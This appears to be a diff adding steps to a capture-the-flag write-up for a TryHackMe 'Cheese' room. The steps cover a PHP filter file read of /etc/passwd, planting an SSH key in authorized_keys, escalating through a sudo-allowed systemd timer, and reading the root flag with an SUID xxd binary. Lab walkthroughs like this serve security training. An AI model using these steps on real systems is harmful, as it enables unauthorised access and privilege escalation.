@@ -25,11 +25,37 @@ the url reads -> `cheese.thm/secret-script/php?file=php://filter/resource=/etc/p
 - follow the commands in [PHP Filters Chain | Exploit Notes](https://exploit-notes.hdks.org/exploit/web/security-risk/php-filters-chain/) -  in order for these to work open a web server `python3 -m http.server 80`
 ### www-data to user 
 
-we have option to write to authoriz 
+We have option to write to authorized keys (file) in the `.ssh` directory  
+- so create a private and public key via - 
+```
+ssh-keygen
+```
 
+note down the place where the key is being stored
+in order to copy the key in to the authorized keys file u can just 
 
+```sh
+echo "sshkey...." >> authorized_keys
+```
 
+once u add ur public key in the file then u can directly ssh as the user as it will use ur private key to authenticate
+### Privesc
 
+`sudo -l` gives the following output
+```
+(ALL) NOPASSWD: /bin/systemctl daemon-reload
+(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
+(ALL) NOPASSWD: /bin/systemctl start exploit.timer
+(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
+```
+
+you can find `exploit.timer` in `/etc/systemd/system` that is where services lie
+1. the script copies `xxd` binary and sets the SUID bit
+2. modify the script to have a timer of 5 seconds
+3. now go to GTFOBINs to see the exploit for the `xxd` binary 
+```
+./xxd "/root/root.txt" | xxd -r
+```
 ### References
 [TryHackMe | Cyber Security Training](https://tryhackme.com/room/cheesectfv10)
 
